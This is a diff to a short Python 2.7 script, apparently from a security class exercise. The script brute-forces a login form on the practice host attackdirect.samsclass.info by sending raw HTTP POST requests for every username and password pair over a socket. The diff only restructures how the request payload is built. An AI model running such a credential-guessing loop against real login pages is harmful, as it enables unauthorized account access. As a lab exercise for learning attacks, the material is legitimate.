@@ -1,7 +1,6 @@
 # Python 2.7.10
 # - Does not work in Python 3. Yet.
 
-
 import socket
 
 # HTTP POST Request grabbed from POST to login form at http://attackdirect.samsclass.info/python/login1.php
@@ -33,10 +32,16 @@ for usr in username:
 
   for psw in password:
 
-    length = len(usr) + len(psw) + 5
+    length = str(len(usr) + len(psw) + 5)
 
     s = socket.socket()
+    
+    variables = {'request1': req1, 'request2': req2, 'username': usr, 'password': psw, 'length': length}       # Unneeded in Python 3
+    
+    payload = "{request1}{length}\n{request2}u={username}&p={password}\n".format(**variables)
+    # payload = f"{req1}{length}\n{req2}u={usr}&p={psw}\n"                                                     # f-string version - Doesn't work in 2.7
+    
     s.connect(("attackdirect.samsclass.info", 80))
-    s.send(req1 + str(length) + '\n' + req2 + "u=" + usr + "&p=" + psw + '\n')
+    s.send(payload)
     print s.recv(1024)
     s.close()
